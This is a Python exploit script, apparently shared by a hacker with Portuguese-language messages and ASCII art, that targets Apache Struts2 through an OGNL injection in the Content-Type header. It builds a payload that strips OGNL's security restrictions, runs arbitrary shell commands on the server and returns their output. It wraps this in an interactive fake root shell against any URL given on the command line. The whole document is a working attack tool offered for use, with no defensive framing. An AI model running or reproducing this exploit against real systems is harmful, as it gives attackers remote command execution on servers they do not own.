#!/usr/bin/python



# *  "-"  * #

# gr33tz: clust3r & kosu.

# *  "-"  * #



import requests
import sys
import urllib3
import os
import random
import argparse
import time
import socket


clust3r_m0mmy = """
                              ______________                               
                        ,===:'.,            `-._                           
                             `:.`---.__         `-._                       
                               `:.     `--.         `.                     
                                 \.        `.         `.                   
                         (,,(,    \.         `.   ____,-`.,                
                      (,'     `/   \.   ,--.___`.'                         
                  ,  ,'  ,--.  `,   \.;'         `                         
                   `{D, {    \  :    \;                                    
                     V,,'    /  /    //                                    
                     j;;    /  ,' ,-//.    ,---.      ,                    
                     \;'   /  ,' /  _  \  /  _  \   ,'/                    
                           \   `'  / \  `'  / \  `.' /                     
                            `.___,'   `.__,'   `.__,'   
"""

parser = argparse.ArgumentParser(description='Process some integers.')
parser.add_argument('-u', action= 'store', dest= 'url',
                           default= '', required= True,
                           help= 'URL A ser injetada')

arguments = parser.parse_args()

useragents1 = open("user-agents.txt","r")

for linha in useragents1:
    valores = linha.split("\n")

site = arguments.url
useduser = random.choice(valores)
useragent = {"User-Agent": useduser}


def exploit(cmd):
    payload = "%{(#_='multipart/form-data')."
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?"
    payload += "(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear())."
    payload += "(#context.setMemberAccess(#dm))))."
    payload += "(#cmd='%s')." % cmd
    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
    payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    payload += "(#ros.flush())}"

    headers = {"User-Agent": useduser,
               'Content-Type': payload}
    pwn = requests.get(site, headers=headers, verify=False)
    if pwn.status_code == 400 or "<html>" and "</html>" in pwn.text:
        print("\n\n\n	\033[1;93m (!) Esse site não possui esse tipo de k8.\n\n\n")
        exit()
    else:
        print('\n\033[0;0m\033[1;96m' + pwn.text)

os.system("cls || clear")
print("RCE Script.\n@martinelli0x\n[Target: " + site + "] 	\033[1;92m " + clust3r_m0mmy)
userl0l = socket.gethostname()

while 1==1:
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    comando = input("\033[;1m" + userl0l + "@root $~ \033[;7m")
    try:
        exploit(comando)
    except Exception as error:
        print("\n\n\n(!) Esse site não possui esse tipo de k8.\n\n\n")
        exit()
    time.sleep(1)
